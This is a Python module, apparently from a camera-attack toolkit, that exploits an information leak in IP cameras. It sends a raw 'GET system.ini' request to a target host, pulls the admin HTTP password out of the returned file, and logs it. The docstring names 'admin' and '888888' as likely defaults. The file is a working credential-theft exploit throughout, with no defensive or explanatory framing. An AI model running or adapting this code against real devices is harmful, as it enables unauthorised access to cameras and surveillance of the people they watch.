import socket
from .. import decorators
import logging

"""
Imports:
    socket
    ..decorators
    logging

Contains:
    hack_http_auth
    _find_auth

Constants defined here:
    PACKET_SIZE
    SOCKET_TIMEOUT
    MAX_LIKELY_PASSWORD_LEN
    BLANK_PASSWORD
"""

logger = logging.getLogger(__name__)
logger.info(f'Library imported: {__name__}')

PACKET_SIZE = 4096
SOCKET_TIMEOUT = 4.0
MAX_LIKELY_PASSWORD_LEN = 100
BLANK_PASSWORD = '\x01'

@decorators.debug()
def hack_http_auth(host, port=80):
    """
    Attempts to hack the HTTP auth
    Returns:
        {
            'username': The HTTP username, most likely 'admin',
            'password': The HTTP password, the default is '888888',
        }
    """

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    sock.setblocking(int(False))
    sock.settimeout(SOCKET_TIMEOUT)

    try:
        sock.connect((host, port))
    except socket.timeout as error_timeout:
        logger.debug('Connection timed-out connecting to host')
        return

    logger.debug('Requesting system.ini')
    logger.info('system.ini leaks the cameras HTTP username and password')

    sock.send(b'GET system.ini HTTP/1.1\r\n\r\n')

    data = b''

    while True:
        try:
            recv_data = sock.recv(PACKET_SIZE)
        except ConnectionResetError as error_connection_reset:
            logger.debug('Connection got reset requesting encoder')
            return
        except socket.timeout as error_timeout:
            logger.debug('Connection timed-out requesting encoder')
            return

        data += recv_data

        if not recv_data:
            logger.debug('End of system.ini reached')

            break

    auth = _find_auth(data)

    if auth is None:
        logger.debug('Could not extract HTTP auth from system.ini')

        return

    username, password = auth

    logger.info('The username is most likely "admin"')

    if username != 'admin':
        logger.warn('Username was not "admin"')

    # assert username == 'admin'

    data = \
    {
        'username': username,
        'password': password,
    }

    return data

@decorators.debug()
def _find_auth(data):
    """
    Attempts to extract the password from
    ... the contents of system.ini
    """

    flag_admin = b'admin'

    index_admin = data.find(flag_admin)

    if index_admin == -1:
        logger.debug \
        (
            '"admin" was not present in system.ini, '
            'stopping extraction'
        )

        return

    data_segment = data[index_admin+len(flag_admin):]
    data_segment_min = [d for d in data_segment.split(b'\x00') if d]

    password = data_segment_min[0].decode()

    if len(password) > MAX_LIKELY_PASSWORD_LEN \
            or '\n' in password \
            or '\r' in password: # Unlikely a password
        logger.debug('Found something, but it was most likely not a password!')

        return

    if password == BLANK_PASSWORD: # Password is 'nothing'
        logger.debug('Password is an empty string')

        password = ''

    logger.debug(f'Found password: {password}')

    return ('admin', password,)
